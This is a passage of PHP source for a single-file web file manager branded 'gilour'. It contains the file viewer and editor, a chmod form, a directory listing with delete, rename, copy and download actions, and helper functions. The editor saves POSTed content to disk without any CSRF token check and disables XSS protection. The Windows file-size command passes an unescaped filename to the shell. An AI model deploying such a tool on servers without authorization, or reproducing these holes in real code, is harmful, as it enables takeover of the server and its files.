                    $hljs_class = isset($hljs_classes[$ext]) ? 'lang-' . $hljs_classes[$ext] : 'lang-' . $ext;
                    if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) {
                        $hljs_class = 'nohighlight';
                    }
                    $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . fanco($content) . '</code></pre>';
                } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                    // php highlight
                    $content = highlight_string($content, true);
                } else {
                    $content = '<pre>' . fanco($content) . '</pre>';
                }
                echo $content;
            }
            ?>
        </div>
    </div>
    <?php
        fm_show_footer();
    exit;
}

// file editor
if (isset($_GET['edit']) and !FM_READONLY) {
    $file = $_GET['edit'];
    $file = fm_clean_path($file, false);
    $file = str_replace('/', '', $file);
    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
    $editFile = ' : <i><b>'. $file. '</b></i>';
    header('X-XSS-Protection:0');
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
    $file_path = $path . '/' . $file;

    // normal editer
    $isNormalEditor = true;
    if (isset($_GET['env'])) {
        if ($_GET['env'] == "ace") {
            $isNormalEditor = false;
        }
    }

    // Save File
    if (isset($_POST['savedata'])) {
        $writedata = $_POST['savedata'];
        $fd = fopen($file_path, "w");
        @fwrite($fd, $writedata);
        fclose($fd);
        fm_set_msg(lng('File Saved Successfully'));
    }

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize = filesize($file_path);
    $is_text = false;
    $content = ''; // for text

    if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    }

    ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php echo lng('Fullscreen') ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo lng('Search') ?>"><i class="fa fa-search" title="<?php echo lng('Search') ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php echo lng('Undo') ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php echo lng('Redo') ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php echo lng('Word Wrap') ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo lng('Select Mode') ?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Theme') ?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Font Size') ?> --</option></select>
                        </div>
                    <?php } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php echo urlencode($file) ?>"><i class="fa fa-reply-all"></i> <?php echo lng('Back') ?></a>
                <a title="<?php echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH)) ?>','<?php echo urlencode($file) ?>')"><i class="fa fa-database"></i> <?php echo lng('BackUp') ?></a>
                <?php if ($is_text) { ?>
                    <?php if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fanco($file_url) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor') ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fanco($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
                        </button>
                    <?php } ?>
                <?php } ?>
            </div>
        </div>
        <?php
        if ($is_text and $isNormalEditor) {
            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($content) . '</textarea>';
            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  and e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
        } elseif ($is_text) {
            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($content) . '</div>';
        } else {
            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
        }
        ?>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['chmod']) and !FM_READONLY and !FM_IS_WIN) {
    $file = $_GET['chmod'];
    $file = fm_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || (!is_file($path . '/' . $file) and !is_dir($path . '/' . $file))) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file;
    $file_path = $path . '/' . $file;

    $mode = fileperms($path . '/' . $file);
    ?>
    <div class="path">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header">
                <?php echo lng('ChangePermissions') ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php $display_path = fm_get_display_path($file_path); ?>
                    <?php echo $display_path['label']; ?>: <?php echo $display_path['path']; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php echo fanco($file) ?>">

                    <table class="table compact-table <?php echo fm_get_theme(); ?>">
                        <tr>
                            <td></td>
                            <td><b><?php echo lng('Owner') ?></b></td>
                            <td><b><?php echo lng('Group') ?></b></td>
                            <td><b><?php echo lng('Other') ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Read') ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php echo ($mode & 00400) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php echo ($mode & 00040) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php echo ($mode & 00004) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Write') ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php echo ($mode & 00200) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php echo ($mode & 00020) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php echo ($mode & 00002) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php echo lng('Execute') ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php echo ($mode & 00100) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php echo ($mode & 00010) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php echo ($mode & 00001) ? ' checked' : '' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>"> 
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Change') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

fm_show_header(); // HEADER
fm_show_nav_path(FM_PATH); // current path

fm_show_message();

$num_files = count($files);
$num_folders = count($folders);
$all_files_size = 0;
$tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white";
?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php echo $tableTheme; ?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php if (!FM_READONLY): ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php endif; ?>
                <th><?php echo lng('Name') ?></th>
                <th><?php echo lng('Size') ?></th>
                <th><?php echo lng('Modified') ?></th>
                <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                    <th><?php echo lng('Perms') ?></th>
                    <th><?php echo lng('Owner') ?></th><?php endif; ?>
                <th><?php echo lng('Actions') ?></th>
            </tr>
            </thead>
            <?php
            if ($parent !== false) {
                ?>
                <tr><?php if (!FM_READONLY): ?>
                    <td class="nosort"></td><?php endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($parent) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php } ?>
                </tr>
                <?php
            }
            $uu = 3399;
            foreach ($folders as $f) {
                $is_link = is_link($path . '/' . $f);
                $img = $is_link ? 'icon-link_folder' : 'fa fa-folder-o';
                $modif_raw = filemtime($path . '/' . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                $filesize_raw = "";
                $filesize = lng('Folder');
                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
                if (function_exists('posix_getpwuid') and function_exists('posix_getgrgid')) {
                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
                    $group = posix_getgrgid(filegroup($path . '/' . $f));
                    if ($owner === false) {
                        $owner = array('name' => '?');
                    }
                    if ($group === false) {
                        $group = array('name' => '?');
                    }
                } else {
                    $owner = array('name' => '?');
                    $group = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $uu ?>" name="file[]" value="<?php echo fanco($f) ?>">
                            <label class="custom-control-label" for="<?php echo $uu ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fm_convert_win(fanco($f)) ?>>
                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fanco($f)) ?>
                            </a><?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div>
                    </td>
                    <td data-order="a-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT);?>">
                        <?php echo $filesize; ?>
                    </td>
                    <td data-order="a-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
                        <td><?php echo $owner['name'] . ':' . $group['name'] ?></td>
                    <?php endif; ?>
                    <td class="inline-actions"><?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, '1028','<?php echo lng('Delete').' '.lng('Folder'); ?>','<?php echo urlencode($f) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fanco(addslashes(FM_PATH)) ?>', '<?php echo fanco(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php echo lng('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $uu++;
            }
            $ik = 6070;
            foreach ($files as $f) {
                $is_link = is_link($path . '/' . $f);
                $img = $is_link ? 'fa fa-file-text-o' : fm_get_file_icon_class($path . '/' . $f);
                $modif_raw = filemtime($path . '/' . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                $filesize_raw = fm_get_size($path . '/' . $f);
                $filesize = fm_get_filesize($filesize_raw);
                $filelink = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($f);
                $all_files_size += $filesize_raw;
                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
                if (function_exists('posix_getpwuid') and function_exists('posix_getgrgid')) {
                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
                    $group = posix_getgrgid(filegroup($path . '/' . $f));
                    if ($owner === false) {
                        $owner = array('name' => '?');
                    }
                    if ($group === false) {
                        $group = array('name' => '?');
                    }
                } else {
                    $owner = array('name' => '?');
                    $group = array('name' => '?');
                }
                ?>
                <tr>
                    <?php if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php echo $ik ?>" name="file[]" value="<?php echo fanco($f) ?>">
                            <label class="custom-control-label" for="<?php echo $ik ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fanco($f) ?>>
                        <div class="filename">
                        <?php
                           if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
                                <?php $imagePreview = fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?>
                                <a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fanco($f) ?>">
                           <?php else: ?>
                                <a href="<?php echo $filelink ?>" title="<?php echo $f ?>">
                            <?php endif; ?>
                                    <i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fanco($f)) ?>
                                </a>
                                <?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="b-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php printf('%s bytes', $filesize_raw) ?>">
                        <?php echo $filesize; ?>
                        </span></td>
                    <td data-order="b-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN and !$hide_Cols): ?>
                        <td><?php if (!FM_READONLY): ?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
                        </td>
                        <td><?php echo fanco($owner['name'] . ':' . $group['name']) ?></td>
                    <?php endif; ?>
                    <td class="inline-actions">
                        <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1209, '<?php echo lng('Delete').' '.lng('File'); ?>','<?php echo urlencode($f); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php echo lng('Rename') ?>" href="#" onclick="rename('<?php echo fanco(addslashes(FM_PATH)) ?>', '<?php echo fanco(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php echo lng('CopyTo') ?>..."
                               href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink') ?>" href="<?php echo fanco(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php echo lng('Download') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Download'); ?>','<?php echo urlencode($f); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $ik++;
            }

            if (empty($folders) and empty($files)) { ?>
                <tfoot>
                    <tr><?php if (!FM_READONLY): ?>
                            <td></td><?php endif; ?>
                        <td colspan="<?php echo (!FM_IS_WIN and !$hide_Cols) ? '6' : '4' ?>"><em><?php echo lng('Folder is empty') ?></em></td>
                    </tr>
                </tfoot>
                <?php
            } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php echo (!FM_IS_WIN and !$hide_Cols) ? (FM_READONLY ? '6' :'7') : (FM_READONLY ? '4' : '5') ?>">
                            <?php echo lng('FullSize').': <span class="badge text-bg-light border-radius-0">'.fm_get_filesize($all_files_size).'</span>' ?>
                            <?php echo lng('File').': <span class="badge text-bg-light border-radius-0">'.$num_files.'</span>' ?>
                            <?php echo lng('Folder').': <span class="badge text-bg-light border-radius-0">'.$num_folders.'</span>' ?>
                        </td>
                    </tr>
                </tfoot>
                <?php } ?>
        </table>
    </div>

    <div class="row">
        <?php if (!FM_READONLY): ?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo lng('SelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo lng('UnSelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo lng('InvertSelection') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo lng('Delete selected files and folders?'); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo lng('Delete') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Zip') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Tar') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy') ?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a href="." target="_blank" class="float-right text-muted">gilour <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="." target="_blank" class="float-right text-muted">gilour <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>

<?php
fm_show_footer();


function print_external($key) {
    global $external;

    if(!array_key_exists($key, $external)) {
        // throw new Exception('Key missing in external: ' . key);
        echo "<!-- EXTERNAL: MISSING KEY $key -->";
        return;
    }

    echo "$external[$key]";
}


function verifyToken($token) 
{
    if (hash_equals($_SESSION['token'], $token)) { 
        return true;
    }
    return false;
}

/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($path)
{
    if (is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rdelete($path . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return ($ok) ? rmdir($path) : false;
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}


function fm_rchmod($path, $filemode, $dirmode)
{
    if (is_dir($path)) {
        if (!chmod($path, $dirmode)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($path)) {
        return true;
    } elseif (is_file($path)) {
        return chmod($path, $filemode);
    }
    return false;
}


function fm_is_valid_ext($filename)
{
    $allowed = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;

    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    return ($isFileAllowed) ? true : false;
}


function fm_rename($old, $new)
{
    $isFileAllowed = fm_is_valid_ext($new);

    if(!is_dir($old)) {
        if (!$isFileAllowed) return false;
    }

    return (!file_exists($new) and file_exists($old)) ? rename($old, $new) : null;
}


function fm_rcopy($path, $dest, $upd = true, $force = true)
{
    if (is_dir($path)) {
        if (!fm_mkdir($dest, $force)) {
            return false;
        }
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return $ok;
    } elseif (is_file($path)) {
        return fm_copy($path, $dest, $upd);
    }
    return false;
}


function fm_mkdir($dir, $force)
{
    if (file_exists($dir)) {
        if (is_dir($dir)) {
            return $dir;
        } elseif (!$force) {
            return false;
        }
        unlink($dir);
    }
    return mkdir($dir, 0777, true);
}


function fm_copy($f1, $f2, $upd)
{
    $time1 = filemtime($f1);
    if (file_exists($f2)) {
        $time2 = filemtime($f2);
        if ($time2 >= $time1 and $upd) {
            return false;
        }
    }
    $ok = copy($f1, $f2);
    if ($ok) {
        touch($f2, $time1);
    }
    return $ok;
}


function fm_get_mime_type($file_path)
{
    if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);
        return $mime;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($file_path);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $file = escapeshellarg($file_path);
        $mime = shell_exec('file -bi ' . $file);
        return $mime;
    } else {
        return '--';
    }
}


function fm_redirect($url, $code = 302)
{
    header('Location: ' . $url, true, $code);
    exit;
}


function get_absolute_path($path) {
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
    $absolutes = array();
    foreach ($parts as $part) {
        if ('.' == $part) continue;
        if ('..' == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $absolutes);
}


function fm_clean_path($path, $trim = true)
{
    $path = $trim ? trim($path) : $path;
    $path = trim($path, '\\/');
    $path = str_replace(array('../', '..\\'), '', $path);
    $path =  get_absolute_path($path);
    if ($path == '..') {
        $path = '';
    }
    return str_replace('\\', '/', $path);
}


function fm_get_parent_path($path)
{
    $path = fm_clean_path($path);
    if ($path != '') {
        $array = explode('/', $path);
        if (count($array) > 1) {
            $array = array_slice($array, 0, -1);
            return implode('/', $array);
        }
        return '';
    }
    return false;
}

function fm_get_display_path($file_path)
{
    global $path_display_mode, $root_path, $root_url;
    switch ($path_display_mode) {
        case 'relative':
            return array(
                'label' => 'Path',
                'path' => fanco(fm_convert_win(str_replace($root_path, '', $file_path)))
            );
        case 'host':
            $relative_path = str_replace($root_path, '', $file_path);
            return array(
                'label' => 'Host Path',
                'path' => fanco(fm_convert_win('/' . $root_url . '/' . ltrim(str_replace('\\', '/', $relative_path), '/')))
            );
        case 'full':
        default:
            return array(
                'label' => 'Full Path',
                'path' => fanco(fm_convert_win($file_path))
            );
    }
}


function fm_is_exclude_items($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (isset($exclude_items) and sizeof($exclude_items)) {
        unset($exclude_items);
    }

    $exclude_items = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        $exclude_items = unserialize($exclude_items);
    }
    if (!in_array($file, $exclude_items) and !in_array("*.$ext", $exclude_items)) {
        return true;
    }
    return false;
}


function fm_get_translations($tr) {
    try {
        $content = @file_get_contents('translation.json');
        if($content !== FALSE) {
            $lng = json_decode($content, TRUE);
            global $lang_list;
            foreach ($lng["language"] as $key => $value)
            {
                $code = $value["code"];
                $lang_list[$code] = $value["name"];
                if ($tr)
                    $tr[$code] = $value["translation"];
            }
            return $tr;
        }

    }
    catch (Exception $e) {
        echo $e;
    }
}


function fm_get_size($file)
{
    static $iswin;
    static $isdarwin;
    if (!isset($iswin)) {
        $iswin = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
    }
    if (!isset($isdarwin)) {
        $isdarwin = (strtoupper(substr(PHP_OS, 0)) == "DARWIN");
    }

    static $exec_works;
    if (!isset($exec_works)) {
        $exec_works = (function_exists('exec') and !ini_get('safe_mode') and @exec('echo EXEC') == 'EXEC');
    }

    // try a shell command
    if ($exec_works) {
        $arg = escapeshellarg($file);
        $cmd = ($iswin) ? "for %F in (\"$file\") do @echo %~zF" : ($isdarwin ? "stat -f%z $arg" : "stat -c%s $arg");
        @exec($cmd, $output);
        if (is_array($output) and ctype_digit($size = trim(implode("\n", $output)))) {
            return $size;
        }
    }

    // try the Windows COM interface
    if ($iswin and class_exists("COM")) {
        try {
            $fsobj = new COM('Scripting.FileSystemObject');
            $f = $fsobj->GetFile( realpath($file) );
            $size = $f->Size;
        } catch (Exception $e) {
            $size = null;
        }
        if (ctype_digit($size)) {
            return $size;
        }
    }

    // if all else fails
    return filesize($file);
}


function fm_get_filesize($size)
{
    $size = (float) $size;
    $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $power = ($size > 0) ? floor(log($size, 1024)) : 0;
    $power = ($power > (count($units) - 1)) ? (count($units) - 1) : $power;
    return sprintf('%s %s', round($size / pow(1024, $power), 2), $units[$power]);
}


function fm_get_directorysize($directory) {
    $bytes = 0;
    $directory = realpath($directory);
    if ($directory !== false and $directory != '' and file_exists($directory)){
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file){
            $bytes += $file->getSize();
        }
    }
    return $bytes;
}


function fm_get_zif_info($path, $ext) {
    if ($ext == 'zip' and function_exists('zip_open')) {
        $arch = @zip_open($path);
        if ($arch) {
            $filenames = array();
            while ($zip_entry = @zip_read($arch)) {
                $zip_name = @zip_entry_name($zip_entry);
                $zip_folder = substr($zip_name, -1) == '/';
                $filenames[] = array(
                    'name' => $zip_name,
                    'filesize' => @zip_entry_filesize($zip_entry),
